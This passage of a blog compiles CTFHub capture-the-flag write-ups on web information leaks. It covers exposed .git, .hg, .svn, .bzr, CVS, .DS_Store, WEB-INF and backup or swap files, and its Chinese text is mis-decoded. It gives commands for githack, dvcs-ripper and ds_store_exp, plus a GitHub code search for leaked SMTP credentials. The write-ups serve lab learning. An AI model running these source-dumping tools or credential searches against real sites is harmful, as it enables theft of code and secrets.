title="å‰è¨€"></a>å‰è¨€</h2><p>ä»¥å‰è™½ç„¶å­¦è¿‡gitï¼Œä½†æ˜¯æ—¶é—´ä¹…è¿œï¼Œè€Œä¸”æ²¡æœ‰å’Œå®‰å…¨æ–¹é¢è”ç³»èµ·æ¥ã€‚è¿™é“Gitæ³„éœ²é¢˜å¯ä»¥è¯´æ˜¯æ¯”è¾ƒç®€å•ï¼Œå¸®åŠ©æˆ‘æ…¢æ…¢æ¶æ„èµ·gitçš„çŸ¥è¯†ã€‚</p><h2 id="é¢˜ç›®èƒŒæ™¯"><a href="#é¢˜ç›®èƒŒæ™¯" class="headerlink" title="é¢˜ç›®èƒŒæ™¯"></a>é¢˜ç›®èƒŒæ™¯</h2><p>å½“å‰å¤§é‡å¼€å‘äººå‘˜ä½¿ç”¨gitè¿›è¡Œç‰ˆæœ¬æ§åˆ¶ï¼Œå¯¹ç«™ç‚¹è‡ªåŠ¨éƒ¨ç½²ã€‚å¦‚æœé…ç½®ä¸å½“,å¯èƒ½ä¼šå°†.gitæ–‡ä»¶å¤¹ç›´æ¥éƒ¨ç½²åˆ°çº¿ä¸Šç¯å¢ƒã€‚è¿™å°±å¼•èµ·äº†gitæ³„éœ²æ¼æ´ã€‚</p><h2 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h2><p>åšè¿™é“é¢˜éœ€è¦ç®€å•çŸ¥é“gitçš„ç›¸å…³å‘½ä»¤ï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git log æ˜¾ç¤ºä»æœ€è¿‘åˆ°æœ€è¿œçš„æäº¤æ—¥å¿—ã€‚ </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git diff ç®€å•çš„æ¥è¯´å°±æ˜¯æŸ¥çœ‹ä¸åŒï¼Œå…·ä½“ç”¨æ³•å¦‚ä¸‹ï¼š</span><br><span class="line">1. git diffï¼šæ˜¯æŸ¥çœ‹working treeä¸indexçš„å·®åˆ«çš„ã€‚</span><br><span class="line">2. git diff --cachedï¼šæ˜¯æŸ¥çœ‹indexä¸repositoryçš„å·®åˆ«çš„ã€‚</span><br><span class="line">3. git diff HEADï¼šæ˜¯æŸ¥çœ‹working treeå’Œrepositoryçš„å·®åˆ«çš„ã€‚å…¶ä¸­ï¼šHEADä»£è¡¨çš„æ˜¯æœ€è¿‘çš„ä¸€æ¬¡commitçš„ä¿¡æ¯ã€‚ </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git reset å¯ç”¨äºå›é€€ç‰ˆæœ¬åº“ </span><br></pre></td></tr></table></figure><p>ä»¥åŠGithackï¼ˆæ³¨æ„ï¼Œgithackéœ€è¦åœ¨python2ä¸­æ‰èƒ½ä½¿ç”¨ï¼Œè€Œä¸”githubä¸Šé¢æœ‰ä¸€ä¸ªgithackæ˜¯ä¸èƒ½ç”¨çš„ï¼Œæˆ‘ä¸€å¼€å§‹å°±ä¸‹äº†é‚£ä¸ªä¸èƒ½ç”¨äº†ç»“æœå¼„äº†å¾ˆä¹…ã€‚ï¼‰çš„ç›¸å…³ç”¨æ³•ã€‚</p><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>æ‰“å¼€ä¹‹åè¿›è¡Œdirsearchæ‰«æï¼Œå‘ç°å­˜åœ¨gitæ³„éœ²ï¼Œä½¿ç”¨Githack</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 githack.py http://challenge-20523a0b6899c975.sandbox.ctfhub.com:10080/.git/ </span><br></pre></td></tr></table></figure><p>ä¹‹åè¿›å…¥githackä¸‹çš„disté‡Œçš„æœ¬é¢˜çš„ç›®å½•ã€‚<br><img src="https://img-blog.csdnimg.cn/20200903185811220.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JmcmRlcg==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ­£å¸¸è¿›å…¥ä¹‹ååº”è¯¥åªæœ‰.logæ–‡ä»¶ï¼Œæˆ‘è¿™é‡Œæœ‰å…¶ä»–çš„ä¸œè¥¿æ˜¯å› ä¸ºæˆ‘å·²ç»å›é€€ç‰ˆæœ¬äº†ï¼Œå¾€ä¸‹çœ‹å°±æ‡‚äº†ã€‚å¦‚æœæ²¡æœ‰.logåº”è¯¥æ˜¯è¢«éšè—äº†ã€‚ç„¶åæ‰“å¼€cmdæˆ–è€…bashéƒ½å¯,è¾“å…¥git logæ˜¾ç¤ºæäº¤æ—¥å¿—ã€‚<br><img src="https://img-blog.csdnimg.cn/20200903190209230.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JmcmRlcg==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰ä¸‰æ¬¡æ“ä½œï¼Œä¸€æ¬¡æ˜¯initåˆå§‹åŒ–ç°æœ‰ä»“åº“ï¼Œç»è¿‡è¿™æ¬¡å‘½ä»¤å°±ä¼šäº§ç”Ÿ.logæ–‡ä»¶ã€‚ä¹‹åæ‰§è¡Œäº†add flagå’Œremove flagã€‚å¯ä»¥åˆ¤æ–­ï¼Œflagåº”è¯¥æ˜¯åœ¨add flagçš„é‚£ä¸ªç‰ˆæœ¬ï¼Œæˆ‘ä»¬ç°åœ¨æ˜¯åœ¨remove flagã€‚æ‰€ä»¥ï¼Œè¿™é¢˜æœ‰ä¸¤ç§è§£æ³•ï¼Œç¬¬ä¸€ç§æ˜¯å›é€€åˆ°ä¹‹å‰çš„ç‰ˆæœ¬ï¼Œgit resetå¯ä»¥å®ç°ã€‚ç¬¬äºŒç§æ˜¯ç›´æ¥æŸ¥çœ‹add flagå’Œremove flagè¿™ä¸¤ä¸ªç‰ˆæœ¬çš„ä¸åŒï¼Œgit diffå¯ä»¥å®ç°ã€‚</p><p>æ–¹æ³•ä¸€ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard HEAD^ </span><br></pre></td></tr></table></figure><p>æ–¹æ³•äºŒï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git diff HEAD^ </span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210506114558483.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1pYV19OVURU,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git diff 37688f87d181f65bbb8be58d69adb16941908440 </span><br></pre></td></tr></table></figure><hr><h1 id="ctfhubæŠ€èƒ½æ ‘â€”ä¿¡æ¯æ³„éœ²â€”gitæ³„éœ²â€”index"><a href="#ctfhubæŠ€èƒ½æ ‘â€”ä¿¡æ¯æ³„éœ²â€”gitæ³„éœ²â€”index" class="headerlink" title="ctfhubæŠ€èƒ½æ ‘â€”ä¿¡æ¯æ³„éœ²â€”gitæ³„éœ²â€”index"></a><a href="https://www.cnblogs.com/anweilx/p/12455850.html">ctfhubæŠ€èƒ½æ ‘â€”ä¿¡æ¯æ³„éœ²â€”gitæ³„éœ²â€”index</a></h1><p>æ‰“å¼€é¶æœº</p><p><img src="https://img2020.cnblogs.com/i-beta/1753051/202003/1753051-20200310150251917-1149440296.png"></p><p>Â æŸ¥çœ‹é¡µé¢ä¿¡æ¯</p><p><img src="https://img2020.cnblogs.com/i-beta/1753051/202003/1753051-20200310150309064-1394916937.png"></p><p>Â ä½¿ç”¨dirsearchè¿›è¡Œæ‰«æ</p><p><img src="https://img2020.cnblogs.com/i-beta/1753051/202003/1753051-20200310151115538-2077300558.png"></p><p>Â ä½¿ç”¨githackå·¥å…·å¤„ç†gitæ³„éœ²æƒ…å†µ</p><p><img src="https://img2020.cnblogs.com/i-beta/1753051/202003/1753051-20200310151222137-1909013470.png"></p><p>Â ä½¿ç”¨git logå‘½ä»¤æŸ¥çœ‹å†å²è®°å½•</p><p><img src="https://img2020.cnblogs.com/i-beta/1753051/202003/1753051-20200310151257631-1998233360.png"></p><p>Â ä¸Â <code>add flag 9b5b58â€¦â€¦</code>Â è¿™æ¬¡æäº¤è¿›è¡Œæ¯”å¯¹</p><p>å³å¯æ‹¿åˆ°flag</p><p><img src="https://img2020.cnblogs.com/i-beta/1753051/202003/1753051-20200310151400149-899771850.png"></p><p>æ–¹æ³•äºŒ</p><p>ä½¿ç”¨git checkoutå‘½ä»¤æŸ¥è¯¢è¾“å‡ºæ–‡ä»¶</p><p><img src="https://img2020.cnblogs.com/i-beta/1753051/202003/1753051-20200310151720378-145511497.png"></p><p>Â è¾“å…¥234261473210834.txtæ–‡ä»¶</p><p>æ–‡ä»¶å†…å³ä¸ºflag</p><p><img src="https://img2020.cnblogs.com/i-beta/1753051/202003/1753051-20200310151856171-705808302.png"></p><p>å‘½ä»¤è§£é‡Š</p><p>åˆ›å»ºæ–°åˆ†æ”¯ï¼šgit branch branchName</p><p>åˆ‡æ¢åˆ°æ–°åˆ†æ”¯ï¼šgit checkout branchName</p><p>ç„¶åï¼Œä¸Šé¢ä¸¤ä¸ªå‘½ä»¤ä¹Ÿå¯ä»¥åˆæˆä¸ºä¸€ä¸ªå‘½ä»¤ï¼š</p><p>git checkout -b branchName</p><p>æ–¹æ³•ä¸‰<br>ç›´æ¥è¿›å…¥ç›®å½•ï¼ŒæŸ¥çœ‹txtæ–‡æ¡£ï¼Œflagåœ¨æ–‡æ¡£ä¸­ã€‚</p><hr><h1 id="hgæ³„éœ²"><a href="#hgæ³„éœ²" class="headerlink" title="hgæ³„éœ²"></a>hgæ³„éœ²</h1><p>èƒ½æ‰«åˆ°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://url/.hg/ </span><br></pre></td></tr></table></figure><p>ä¸gitç±»ä¼¼, hgåœ¨åˆå§‹åŒ–é¡¹ç›®æ—¶, ä¼šåœ¨é¡¹ç›®çš„æ ¹ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªåä¸º<code>.hg</code>çš„éšè—æ–‡ä»¶å¤¹,é‡Œé¢åŒ…å«äº†ä»£ç å’Œåˆ†æ”¯çš„ä¿®æ”¹è®°å½•å’Œå¼€å‘äººå‘˜çš„ç›¸å…³ä¿¡æ¯. å½“å¼€å‘äººå‘˜ä½¿ç”¨ Mercurial è¿›è¡Œç‰ˆæœ¬æ§åˆ¶ï¼Œå¯¹ç«™ç‚¹è‡ªåŠ¨éƒ¨ç½²ã€‚å¦‚æœé…ç½®ä¸å½“,å¯èƒ½ä¼šå°†.hg æ–‡ä»¶å¤¹ç›´æ¥éƒ¨ç½²åˆ°çº¿ä¸Šç¯å¢ƒã€‚è¿™å°±å¼•èµ·äº† hg æ³„éœ²æ¼æ´ã€‚</p><p><a href="https://github.com/kost/dvcs-ripper">dvcs-ripper</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rip-hg.pl -v -u http://url/.hg </span><br></pre></td></tr></table></figure><h1 id="SVN-æºç æ³„éœ²"><a href="#SVN-æºç æ³„éœ²" class="headerlink" title="SVN æºç æ³„éœ²"></a>SVN æºç æ³„éœ²</h1><p>èƒ½æ‰«åˆ°ä»¥ä¸‹ç›®å½•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://url/.svn/entries </span><br></pre></td></tr></table></figure><p>SVNæ˜¯ä¸€ä¸ªå¼€æ”¾æºä»£ç çš„ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿã€‚åœ¨ä½¿ç”¨SVNç®¡ç†æœ¬åœ°ä»£ç è¿‡ç¨‹ä¸­ï¼Œä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªåä¸º.svnçš„éšè—æ–‡ä»¶å¤¹ï¼Œå…¶ä¸­åŒ…å«é‡è¦çš„æºä»£ç ä¿¡æ¯ã€‚ç½‘ç«™ç®¡ç†å‘˜åœ¨å‘å¸ƒä»£ç æ—¶ï¼Œæ²¡æœ‰ä½¿ç”¨â€˜å¯¼å‡ºâ€™åŠŸèƒ½ï¼Œè€Œæ˜¯ç›´æ¥å¤åˆ¶ä»£ç æ–‡ä»¶å¤¹åˆ°WEBæœåŠ¡å™¨ä¸Šï¼Œè¿™å°±ä½¿.svnéšè—æ–‡ä»¶å¤¹è¢«æš´éœ²äºå¤–ç½‘ç¯å¢ƒï¼Œå¯ä»¥åˆ©ç”¨.svn&#x2F;entriesæ–‡ä»¶ï¼Œè·å–åˆ°æœåŠ¡å™¨æºç ã€‚</p><p><a href="https://github.com/kost/dvcs-ripper">dvcs-ripper</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rip-svn.pl -v -u http://www.example.com/.svn/ </span><br></pre></td></tr></table></figure><h1 id="bzr-x2F-Bazaaræ³„éœ²"><a href="#bzr-x2F-Bazaaræ³„éœ²" class="headerlink" title="bzr&#x2F;Bazaaræ³„éœ²"></a>bzr&#x2F;Bazaaræ³„éœ²</h1><p>èƒ½æ‰«åˆ°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://url/.bzr/ </span><br></pre></td></tr></table></figure><p>bzrä¹Ÿæ˜¯ä¸ªç‰ˆæœ¬æ§åˆ¶å·¥å…·, åœ¨åˆå§‹åŒ–é¡¹ç›®æ—¶(bzr init&#x2F;init-repo), ä¼šåœ¨é¡¹ç›®æ ¹ç›®å½•äº§ç”Ÿåä¸º<code>.bzr</code>çš„éšè—ç›®å½•, åŒæ ·æš´éœ²äº†æºä»£ç å’Œç”¨æˆ·ä¿¡æ¯.</p><p><a href="https://github.com/kost/dvcs-ripper">dvcs-ripper</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rip-bzr.pl -v -u http://www.example.com/.bzr/ </span><br></pre></td></tr></table></figure><h1 id="CVSæ³„æ¼"><a href="#CVSæ³„æ¼" class="headerlink" title="CVSæ³„æ¼"></a>CVSæ³„æ¼</h1><p>èƒ½æ‰«åˆ°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://url/CVS/Root è¿”å›æ ¹ä¿¡æ¯ </span><br><span class="line">http://url/CVS/Entries è¿”å›æ‰€æœ‰æ–‡ä»¶çš„ç»“æ„ </span><br></pre></td></tr></table></figure><p>cvsé¡¹ç›®åœ¨åˆå§‹åŒ–(cvs checkout <code>project</code>)çš„æ—¶å€™, ä¼šåœ¨<code>project</code>ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªåä¸º<code>CVS</code>çš„ç›®å½•,<br>å…¶ä¸­ä¿å­˜äº†å„ä¸ªæ–‡ä»¶çš„ä¿®æ”¹å’Œcommitè®°å½•. é€šè¿‡æ­¤ç›®å½•å¯ä»¥è·å–ä»£ç çš„å†å²ç‰ˆæœ¬. å…¶ä¸­ä¸¤ä¸ªå…³é”®æ–‡ä»¶ä¸º:<br><code>CVS/Root</code>å’Œ<code>CVS/Entries</code>, åˆ†åˆ«è®°å½•äº†é¡¹ç›®çš„æ ¹ä¿¡æ¯å’Œæ‰€æœ‰æ–‡ä»¶çš„ç»“æ„</p><p><a href="https://github.com/kost/dvcs-ripper">dvcs-ripper</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rip-cvs.pl -v -u http://www.example.com/CVS/ </span><br></pre></td></tr></table></figure><h1 id="DS-Store-æ–‡ä»¶æ³„éœ²"><a href="#DS-Store-æ–‡ä»¶æ³„éœ²" class="headerlink" title="DS_Store æ–‡ä»¶æ³„éœ²"></a>DS_Store æ–‡ä»¶æ³„éœ²</h1><p>èƒ½æ‰«åˆ°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://url/.DS_Store </span><br></pre></td></tr></table></figure><p>.DS_Storeæ˜¯Macä¸‹Finderç”¨æ¥ä¿å­˜å¦‚ä½•å±•ç¤º æ–‡ä»¶&#x2F;æ–‡ä»¶å¤¹ çš„æ•°æ®æ–‡ä»¶ï¼Œæ¯ä¸ªæ–‡ä»¶å¤¹ä¸‹å¯¹åº”ä¸€ä¸ªã€‚å¦‚æœå°†.DS_Storeä¸Šä¼ éƒ¨ç½²åˆ°æœåŠ¡å™¨ï¼Œå¯èƒ½é€ æˆæ–‡ä»¶ç›®å½•ç»“æ„æ³„æ¼ï¼Œç‰¹åˆ«æ˜¯å¤‡ä»½æ–‡ä»¶ã€æºä»£ç æ–‡ä»¶ã€‚</p><p><a href="https://github.com/lijiejie/ds_store_exp">dsstoreexp</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ds_store_exp.py http://url/.DS_Store </span><br></pre></td></tr></table></figure><h1 id="WEB-INF-x2F-web-xmlæ³„éœ²"><a href="#WEB-INF-x2F-web-xmlæ³„éœ²" class="headerlink" title="WEB-INF&#x2F;web.xmlæ³„éœ²"></a>WEB-INF&#x2F;web.xmlæ³„éœ²</h1><p>WEB-INFæ˜¯Javaçš„WEBåº”ç”¨çš„å®‰å…¨ç›®å½•ã€‚å¦‚æœæƒ³åœ¨é¡µé¢ä¸­ç›´æ¥è®¿é—®å…¶ä¸­çš„æ–‡ä»¶ï¼Œå¿…é¡»é€šè¿‡web.xmlæ–‡ä»¶å¯¹è¦è®¿é—®çš„æ–‡ä»¶è¿›è¡Œç›¸åº”æ˜ å°„æ‰èƒ½è®¿é—®ã€‚</p><p>é€šå¸¸ä¸€äº›webåº”ç”¨æˆ‘ä»¬ä¼šä½¿ç”¨å¤šä¸ªwebæœåŠ¡å™¨æ­é…ä½¿ç”¨ï¼Œè§£å†³å…¶ä¸­çš„ä¸€ä¸ªwebæœåŠ¡å™¨çš„æ€§èƒ½ç¼ºé™·ä»¥åŠåšå‡è¡¡è´Ÿè½½çš„ä¼˜ç‚¹å’Œå®Œæˆä¸€äº›åˆ†å±‚ç»“æ„çš„å®‰å…¨ç­–ç•¥ç­‰ã€‚åœ¨ä½¿ç”¨è¿™ç§æ¶æ„çš„æ—¶å€™ï¼Œç”±äºå¯¹é™æ€èµ„æºçš„ç›®å½•æˆ–æ–‡ä»¶çš„æ˜ å°„é…ç½®ä¸å½“ï¼Œå¯èƒ½ä¼šå¼•å‘ä¸€äº›çš„å®‰å…¨é—®é¢˜ï¼Œå¯¼è‡´web.xmlç­‰æ–‡ä»¶èƒ½å¤Ÿè¢«è¯»å–ã€‚</p><p>WEB-INFä¸»è¦åŒ…å«ä¸€ä¸‹æ–‡ä»¶æˆ–ç›®å½•ï¼š</p><ul><li><code>/WEB-INF/web.xml</code>ï¼šWebåº”ç”¨ç¨‹åºé…ç½®æ–‡ä»¶ï¼Œæè¿°äº† servlet å’Œå…¶ä»–çš„åº”ç”¨ç»„ä»¶é…ç½®åŠå‘½åè§„åˆ™ã€‚</li><li><code>/WEB-INF/classes/</code>ï¼šå«äº†ç«™ç‚¹æ‰€æœ‰ç”¨çš„ class æ–‡ä»¶ï¼ŒåŒ…æ‹¬ servlet class å’Œéservlet classï¼Œä»–ä»¬ä¸èƒ½åŒ…å«åœ¨ .jaræ–‡ä»¶ä¸­</li><li><code>/WEB-INF/lib/</code>ï¼šå­˜æ”¾webåº”ç”¨éœ€è¦çš„å„ç§JARæ–‡ä»¶ï¼Œæ”¾ç½®ä»…åœ¨è¿™ä¸ªåº”ç”¨ä¸­è¦æ±‚ä½¿ç”¨çš„jaræ–‡ä»¶,å¦‚æ•°æ®åº“é©±åŠ¨jaræ–‡ä»¶</li><li><code>/WEB-INF/src/</code>ï¼šæºç ç›®å½•ï¼ŒæŒ‰ç…§åŒ…åç»“æ„æ”¾ç½®å„ä¸ªjavaæ–‡ä»¶ã€‚</li><li><code>/WEB-INF/database.properties</code>ï¼šæ•°æ®åº“é…ç½®æ–‡ä»¶æ¼æ´æ£€æµ‹ä»¥åŠåˆ©ç”¨æ–¹æ³•</li></ul><p>åˆ©ç”¨ï¼š</p><p>é€šè¿‡æ‰¾åˆ°web.xmlæ–‡ä»¶ï¼Œæ¨æ–­classæ–‡ä»¶çš„è·¯å¾„ï¼Œæœ€åç›´æ¥classæ–‡ä»¶ï¼Œåœ¨é€šè¿‡åç¼–è¯‘classæ–‡ä»¶ï¼Œå¾—åˆ°ç½‘ç«™æºç ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://url/WEB-INF/web.xml </span><br></pre></td></tr></table></figure><h1 id="GitHubæºç æ³„æ¼"><a href="#GitHubæºç æ³„æ¼" class="headerlink" title="GitHubæºç æ³„æ¼"></a>GitHubæºç æ³„æ¼</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/search?q=smtp+user+@qq.com&amp;type=code </span><br></pre></td></tr></table></figure><h3 id="ctfhubâ€“webâ€“ä¿¡æ¯æ³„éœ²"><a href="#ctfhubâ€“webâ€“ä¿¡æ¯æ³„éœ²" class="headerlink" title="ctfhubâ€“webâ€“ä¿¡æ¯æ³„éœ²"></a>ctfhubâ€“webâ€“ä¿¡æ¯æ³„éœ²</h3><ul><li><ul><li><ul><li><a href="#1_1">1.ç›®å½•éå†</a></li><li><a href="#2phpinfo_5">2.phpinfo</a></li><li><a href="#3__8">3. å¤‡ä»½æ–‡ä»¶ä¸‹è½½</a></li><li><a href="#4Github_27">4.Githubæ³„éœ²</a></li><li><a href="#5SVN_50">5.SVNæ³„éœ²</a></li><li><a href="#6HG_52">6.HGæ³„éœ²</a></li></ul></li></ul></li></ul><h3 id="1-ç›®å½•éå†"><a href="#1-ç›®å½•éå†" class="headerlink" title="1.ç›®å½•éå†"></a>1.ç›®å½•éå†</h3><p><img src="https://img-blog.csdnimg.cn/52f4e1b0a44047e0a554c913e65295b6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARuOAgk4g5Zi_5Zi_,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="2-phpinfo"><a href="#2-phpinfo" class="headerlink" title="2.phpinfo"></a>2.phpinfo</h3><p>flag.åœ¨phpinfoé‡Œ<br><img src="https://img-blog.csdnimg.cn/41ceee4ef08e40e395b55737f317155a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARuOAgk4g5Zi_5Zi_,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="3-å¤‡ä»½æ–‡ä»¶ä¸‹è½½"><a href="#3-å¤‡ä»½æ–‡ä»¶ä¸‹è½½" class="headerlink" title="3. å¤‡ä»½æ–‡ä»¶ä¸‹è½½"></a>3. å¤‡ä»½æ–‡ä»¶ä¸‹è½½</h3><p><em>a.ç½‘ç«™æºç </em><br><img src="https://img-blog.csdnimg.cn/3361af932fd446498e294ae1e1f57d13.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARuOAgk4g5Zi_5Zi_,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>éå†ä»¥ä¸Šå¤‡ä»½æ–‡ä»¶å<br><img src="https://img-blog.csdnimg.cn/a7b20f3c97c44b20b5a147b8dac2af29.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARuOAgk4g5Zi_5Zi_,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><img src="https://img-blog.csdnimg.cn/79a9365251f04d9590a3e19363334a68.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARuOAgk4g5Zi_5Zi_,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/a7680b5ebac44afaad757ce5afc13ad8.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARuOAgk4g5Zi_5Zi_,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åœ¨urlä¸­è®¿é—®flagæ–‡ä»¶<br><img src="https://img-blog.csdnimg.cn/53c5abc2fa33410a9946afe877f6f41c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARuOAgk4g5Zi_5Zi_,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><em>b.bakæ–‡ä»¶</em></p><p>è®¿é—®<code>/index.php.bak</code>ä¸ºå¸¸ç”¨å¤‡ä»½æ–‡ä»¶å<br><img src="https://img-blog.csdnimg.cn/8b9e37a732274c59b046d4f8e23d2894.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARuOAgk4g5Zi_5Zi_,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><img src="https://img-blog.csdnimg.cn/0e5948773d274554bc7ccf9af608878b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARuOAgk4g5Zi_5Zi_,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><em>c.vimç¼“å­˜</em></p><p>vimç¼–è¾‘æ—¶å¼‚å¸¸é€€å‡ºï¼Œä¼šäº§ç”Ÿç¼“å­˜æ–‡ä»¶ï¼Œåç¼€ä¸º<code>.swp</code>,ç¬¬äºŒæ¬¡äº§ç”Ÿä¸º<code>.swo</code>ï¼Œç¬¬ä¸‰æ¬¡ä¸º<code>.swn</code>æ­¤æ–‡ä»¶ä¸ºéšè—æ–‡ä»¶ï¼Œæ‰€ä»¥æŸ¥çœ‹æ—¶åº”åœ¨æœ€å‰é¢åŠ ä¸€ä¸ª<code>.</code>ï¼Œå¦‚<code>.index.php.swp</code><br><img src="https://img-blog.csdnimg.cn/53107e852ee84e2281450c008f81478f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARuOAgk4g5Zi_5Zi_,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><img src="https://img-blog.csdnimg.cn/08183ad12742417e98dac6ceb14292bd.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARuOAgk4g5Zi_5Zi_,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><em>dâ€¦DS_Store</em></p><p>.DS_Store æ˜¯ Mac OS ä¿å­˜æ–‡ä»¶å¤¹çš„è‡ªå®šä¹‰å±æ€§çš„éšè—æ–‡ä»¶ã€‚é€šè¿‡.DS_Storeå¯ä»¥çŸ¥é“è¿™ä¸ªç›®å½•é‡Œé¢æ‰€æœ‰æ–‡ä»¶çš„æ¸…å•ã€‚<br><img src="https://img-blog.csdnimg.cn/15406ff490df401ba44129eeba0d6b80.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARuOAgk4g5Zi_5Zi_,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><img src="https://img-blog.csdnimg.cn/8bf8d39cbbd240e3ab9f8aff87d25acb.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARuOAgk4g5Zi_5Zi_,size_20,color_FFFFFF,t_70,g_se,x_16" 